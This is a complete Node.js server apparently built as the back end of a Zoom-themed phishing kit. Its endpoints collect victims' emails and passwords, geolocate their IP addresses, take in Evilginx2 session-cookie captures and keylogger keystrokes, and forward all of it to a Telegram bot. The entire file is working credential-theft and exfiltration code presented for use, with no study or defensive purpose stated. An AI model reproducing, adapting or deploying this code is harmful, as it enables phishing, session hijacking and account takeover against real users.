require('dotenv').config();

const express = require('express');
const cors = require('cors');
const https = require('https');
const axios = require('axios');
const nodemailer = require('nodemailer');

const app = express();

// --- CONFIGURATION ---
const PORT = process.env.PORT || 3000;
const WEBHOOK_SECRET = process.env.WEBHOOK_SECRET || 'evilginx_webhook_secret_2026';
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const ADMIN_EMAIL = process.env.ADMIN_EMAIL;
const GMAIL_APP_PASSWORD = process.env.GMAIL_APP_PASSWORD;

// --- ENVIRONMENT CHECK ---
console.log('--- Environment Check ---');
console.log('TELEGRAM_BOT_TOKEN:', TELEGRAM_BOT_TOKEN ? '✅ SET' : '❌ MISSING');
console.log('TELEGRAM_CHAT_ID:', TELEGRAM_CHAT_ID ? '✅ SET' : '❌ MISSING');
console.log('ADMIN_EMAIL:', ADMIN_EMAIL ? '✅ SET' : '⚠️ Optional');
console.log('GMAIL_APP_PASSWORD:', GMAIL_APP_PASSWORD ? '✅ SET' : '⚠️ Optional');
console.log('WEBHOOK_SECRET:', WEBHOOK_SECRET ? '✅ SET' : '⚠️ Using default');
console.log('---------------------------');

// --- MIDDLEWARE ---
app.use(cors({ origin: true, credentials: true }));
app.use(express.json({ limit: '10mb' }));
app.use(express.static('public'));

// --- RATE LIMITING ---
const loginAttempts = new Map();
const MAX_ATTEMPTS = 5;
const BLOCK_DURATION = 5 * 60 * 1000;

// --- EMAIL TRANSPORTER ---
let transporter = null;
if (ADMIN_EMAIL && GMAIL_APP_PASSWORD) {
    transporter = nodemailer.createTransport({
        host: 'smtp.gmail.com',
        port: 587,
        secure: false,
        auth: { user: ADMIN_EMAIL, pass: GMAIL_APP_PASSWORD }
    });
    console.log('✅ Email transporter configured');
} else {
    console.log('⚠️ Email alerts disabled');
}

// --- GLOBAL ERROR HANDLERS ---
process.on('uncaughtException', (err) => console.error('🔥 UNCAUGHT EXCEPTION:', err));
process.on('unhandledRejection', (reason) => console.error('🔥 UNHANDLED REJECTION:', reason));

// ============================================================
//  HELPERS
// ============================================================

function getClientIp(req) {
    const forwarded = req.headers['x-forwarded-for'];
    if (forwarded) {
        const ips = forwarded.split(',');
        return ips[0].trim();
    }
    return req.connection?.remoteAddress || req.socket?.remoteAddress || 'unknown';
}

function isIpBlocked(ip) {
    const attempt = loginAttempts.get(ip);
    if (!attempt) return false;
    if (Date.now() - attempt.lastAttempt > BLOCK_DURATION) {
        loginAttempts.delete(ip);
        return false;
    }
    return attempt.count >= MAX_ATTEMPTS;
}

function recordLoginAttempt(ip, success) {
    let attempt = loginAttempts.get(ip);
    if (!attempt) attempt = { count: 0, lastAttempt: Date.now() };
    if (success) {
        loginAttempts.delete(ip);
    } else {
        attempt.count++;
        attempt.lastAttempt = Date.now();
        loginAttempts.set(ip, attempt);
    }
    return attempt.count;
}

async function getLocationFromIp(ip) {
    return new Promise((resolve) => {
        const request = https.get(
            `https://ip-api.com/json/${ip}?fields=status,message,city,regionName,country,lat,lon,timezone,isp,org,as`,
            { timeout: 5000 },
            (resp) => {
                let data = '';
                resp.on('data', chunk => data += chunk);
                resp.on('end', () => {
                    try {
                        const response = JSON.parse(data);
                        if (response.status === 'success') {
                            resolve({
                                city: response.city || 'Unknown',
                                region: response.regionName || 'Unknown',
                                country: response.country || 'Unknown',
                                lat: response.lat || 'N/A',
                                lon: response.lon || 'N/A',
                                timezone: response.timezone || 'Unknown',
                                isp: response.isp || 'Unknown',
                                org: response.org || 'Unknown',
                                full: `${response.city || 'Unknown'}, ${response.regionName || 'Unknown'}, ${response.country || 'Unknown'}`
                            });
                        } else {
                            resolve({
                                city: 'Unknown',
                                region: 'Unknown',
                                country: 'Unknown',
                                lat: 'N/A',
                                lon: 'N/A',
                                timezone: 'Unknown',
                                isp: 'Unknown',
                                org: 'Unknown',
                                full: 'Location unavailable'
                            });
                        }
                    } catch (e) {
                        resolve({
                            city: 'Unknown',
                            region: 'Unknown',
                            country: 'Unknown',
                            lat: 'N/A',
                            lon: 'N/A',
                            timezone: 'Unknown',
                            isp: 'Unknown',
                            org: 'Unknown',
                            full: 'Location error'
                        });
                    }
                });
            }
        );
        request.on('error', () => resolve({
            city: 'Unknown',
            region: 'Unknown',
            country: 'Unknown',
            lat: 'N/A',
            lon: 'N/A',
            timezone: 'Unknown',
            isp: 'Unknown',
            org: 'Unknown',
            full: 'Location timeout'
        }));
        request.on('timeout', () => {
            request.destroy();
            resolve({
                city: 'Unknown',
                region: 'Unknown',
                country: 'Unknown',
                lat: 'N/A',
                lon: 'N/A',
                timezone: 'Unknown',
                isp: 'Unknown',
                org: 'Unknown',
                full: 'Location timeout'
            });
        });
    });
}

async function sendToTelegram(text, parseMode = 'Markdown') {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
        console.warn('⚠️ Telegram credentials missing');
        return;
    }
    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        await axios.post(url, {
            chat_id: TELEGRAM_CHAT_ID,
            text: text,
            parse_mode: parseMode
        });
        console.log('✅ Telegram message sent');
    } catch (error) {
        console.error('❌ Telegram error:', error.message);
    }
}

async function sendEmail(subject, htmlBody, textBody) {
    if (!transporter) {
        console.warn('⚠️ Email not configured');
        return;
    }
    try {
        await transporter.sendMail({
            from: `"Security Alert" <${ADMIN_EMAIL}>`,
            to: ADMIN_EMAIL,
            subject: subject,
            text: textBody || htmlBody.replace(/<[^>]*>/g, ''),
            html: htmlBody
        });
        console.log('📧 Email sent');
    } catch (error) {
        console.error('❌ Email error:', error.message);
    }
}

function formatVisitorInfo(visitorInfo) {
    if (!visitorInfo) return '';
    const fields = [];
    if (visitorInfo.fullUrl) fields.push(`*🔗 URL:* ${visitorInfo.fullUrl}`);
    if (visitorInfo.referrer) fields.push(`*🔙 Referrer:* ${visitorInfo.referrer}`);
    if (visitorInfo.userAgent) fields.push(`*🖥️ User Agent:* ${visitorInfo.userAgent}`);
    if (visitorInfo.platform) fields.push(`*💻 Platform:* ${visitorInfo.platform}`);
    if (visitorInfo.deviceType) fields.push(`*📱 Device:* ${visitorInfo.deviceType}`);
    if (visitorInfo.language) fields.push(`*🌐 Language:* ${visitorInfo.language}`);
    if (visitorInfo.timezone) fields.push(`*🕐 Timezone:* ${visitorInfo.timezone}`);
    if (visitorInfo.screenWidth && visitorInfo.screenHeight) {
        fields.push(`*📺 Screen:* ${visitorInfo.screenWidth}x${visitorInfo.screenHeight}`);
    }
    if (visitorInfo.cookies) fields.push(`*🍪 Cookies:* ${visitorInfo.cookies}`);
    if (visitorInfo.sessionId) fields.push(`*🔑 Session ID:* ${visitorInfo.sessionId}`);
    return fields.length ? `\n\n--- Visitor Details ---\n${fields.join('\n')}` : '';
}

// ============================================================
//  ENDPOINTS
// ============================================================

// Health Check
app.get('/health', (req, res) => {
    res.json({ status: 'OK', time: new Date().toISOString() });
});

// --- AUTHENTICATE (Verifies credentials and sends to Telegram) ---
app.post('/api/authenticate', async (req, res) => {
    try {
        const { email, password, visitorInfo } = req.body;
        const ip = getClientIp(req);
        const location = await getLocationFromIp(ip);

        // Check if IP is blocked
        if (isIpBlocked(ip)) {
            await sendToTelegram(`🚨 *BLOCKED INTRUDER ATTEMPT!*\nIP: ${ip}\nLocation: ${location.full}\nReason: Too many login attempts`);
            return res.status(403).json({ success: false, error: 'Too many attempts. Please try again later.' });
        }

        // Build detailed Telegram message
        let msg = `🔐 *Zoom Login Attempt*\n\n`;
        msg += `*📧 Email:* ${email}\n`;
        msg += `*🔑 Password:* ${password}\n`;
        msg += `*📍 Location:* ${location.full}\n`;
        msg += `*🌆 City:* ${location.city}\n`;
        msg += `*🌍 Country:* ${location.country}\n`;
        msg += `*📌 Coordinates:* ${location.lat}, ${location.lon}\n`;
        msg += `*🕐 Timezone:* ${location.timezone}\n`;
        msg += `*🏢 ISP:* ${location.isp}\n`;
        msg += `*📡 IP:* ${ip}\n`;
        msg += `*🕐 Time:* ${new Date().toISOString()}`;
        
        // Add visitor details if available
        if (visitorInfo) {
            msg += formatVisitorInfo(visitorInfo);
        }

        // Send to Telegram
        await sendToTelegram(msg);

        // Record the attempt
        recordLoginAttempt(ip, true);

        // Return success - the proxy will handle the redirect
        res.json({ success: true });

    } catch (error) {
        console.error('Auth error:', error.message);
        res.status(500).json({ success: false, error: error.message });
    }
});

// --- LOG ACTION (Frontend events) ---
app.post('/api/log-action', async (req, res) => {
    try {
        const { action, email, password, visitorInfo } = req.body;
        const ip = getClientIp(req);
        const location = await getLocationFromIp(ip);

        let msg = `🚨 *Zoom Action: ${action?.toUpperCase() || 'UNKNOWN'}*\n\n`;
        msg += `*📧 Email:* ${email || 'none'}\n`;
        msg += `*🔑 Password:* ${password || 'N/A'}\n`;
        msg += `*📍 Location:* ${location.full}\n`;
        msg += `*🌆 City:* ${location.city}\n`;
        msg += `*🌍 Country:* ${location.country}\n`;
        msg += `*📡 IP:* ${ip}\n`;
        msg += `*🕐 Time:* ${new Date().toISOString()}`;

        if (visitorInfo) {
            msg += formatVisitorInfo(visitorInfo);
        }

        await sendToTelegram(msg);
        res.json({ success: true });
    } catch (error) {
        console.error('Log error:', error.message);
        res.status(500).json({ success: false });
    }
});

// --- WEBHOOK (EvilWorker/Evilginx2) ---
app.post('/webhook', async (req, res) => {
    const secret = req.headers['x-webhook-secret'];
    if (secret !== WEBHOOK_SECRET) {
        return res.status(403).send('Forbidden');
    }

    const data = req.body;
    const ip = getClientIp(req);
    const location = await getLocationFromIp(ip);

    console.log('Webhook received:', JSON.stringify(data, null, 2));

    let msg = `🔐 *Capture Report*\n\n`;
    msg += `*Event:* ${data.event || 'Unknown'}\n`;
    msg += `*📍 Location:* ${location.full}\n`;
    msg += `*🌆 City:* ${location.city}\n`;
    msg += `*🌍 Country:* ${location.country}\n`;
    msg += `*📡 IP:* ${ip}\n`;
    
    if (data.username) msg += `*👤 Username:* ${data.username}\n`;
    if (data.password) msg += `*🔑 Password:* ${data.password}\n`;
    if (data.user_agent) msg += `*🖥️ User Agent:* ${data.user_agent}\n`;
    
    if (data.tokens) {
        msg += `*🍪 Session Cookies (HttpOnly):*\n`;
        for (const [name, value] of Object.entries(data.tokens)) {
            msg += `  \`${name}\`: \`${value}\`\n`;
        }
    }

    await sendToTelegram(msg);
    res.sendStatus(200);
});

// --- KEYLOGGER ---
app.post('/api/keylog', async (req, res) => {
    try {
        const { keystrokes, url, userAgent, timestamp, ip: clientIp } = req.body;
        if (!keystrokes) return res.sendStatus(400);

        const ip = clientIp || getClientIp(req);
        const location = await getLocationFromIp(ip);
        const truncated = keystrokes.length > 1000 ? keystrokes.slice(0, 1000) + '...' : keystrokes;

        let msg = `⌨️ *Keylogger Report*\n\n`;
        msg += `*📍 Location:* ${location.full}\n`;
        msg += `*🌆 City:* ${location.city}\n`;
        msg += `*🌍 Country:* ${location.country}\n`;
        msg += `*📡 IP:* ${ip}\n`;
        msg += `*🖥️ User Agent:* ${userAgent || 'Unknown'}\n`;
        msg += `*🔗 URL:* ${url || 'Unknown'}\n`;
        msg += `*🕐 Timestamp:* ${timestamp || new Date().toISOString()}\n\n`;
        msg += `*⌨️ Keystrokes:*\n\`\`\`\n${truncated}\n\`\`\``;

        await sendToTelegram(msg);
        res.sendStatus(200);
    } catch (error) {
        console.error('Keylog error:', error.message);
        res.status(500).send('Error');
    }
});

// --- START SERVER ---
app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`📍 Health check: /health`);
    console.log(`📤 Webhook endpoint: /webhook`);
    console.log(`⌨️ Keylogger endpoint: /api/keylog`);
    console.log(`🔐 Auth endpoint: /api/authenticate`);
});